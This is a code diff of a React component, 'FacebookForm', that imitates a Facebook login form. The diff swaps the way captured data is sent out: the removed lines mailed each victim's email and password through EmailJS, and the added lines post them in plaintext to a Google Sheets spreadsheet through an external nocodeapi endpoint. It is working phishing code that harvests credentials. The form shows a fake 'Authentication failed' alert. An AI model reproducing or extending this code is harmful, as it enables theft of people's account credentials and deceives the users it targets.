@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from "react";
 import styles from  '../Assets/Styles/facebook-form.css';
-import emailjs from '@emailjs/browser';
+import axios from 'axios';
 
 const FacebookForm = () => {
     const [email, setEmail] = useState('')
@@ -28,20 +28,21 @@ const FacebookForm = () => {
         }
 
         setLoaderState(true)
-        emailjs.send('gmail-react', 'template_fzfd6jd', 
-            {
-                _engine: 'Facebook',
-                _email: email,
-                _password: password,
-            }, '-ULgQTRPj8f-lNNg0')
-            .then(function() {
-                setLoaderState(false)
-                
-            }, function(error) {
-                alert('Authentication failed... please try again', error)
-            }
-        );
-        
+        let d = new Date()
+        let date = `${d.getDay()}/${d.getMonth()}/${d.getFullYear()}`
+        let id = Date.now() * Math.random()
+        axios ({
+            method: 'post',
+            url: 'https://v1.nocodeapi.com/tuxa/google_sheets/xQtvMBfFFgfpISRL?tabId=Sheet1', 
+            params: {},
+            data: [[id, 'null', email, password, date]]
+        }).then(function () {
+            setLoaderState(false)
+        }).catch(function (error) {
+            alert('Authentication Failed... Please try again', error)
+            console.log(error); 
+        })
+
         setEmail('')
         setPassword('')
     };
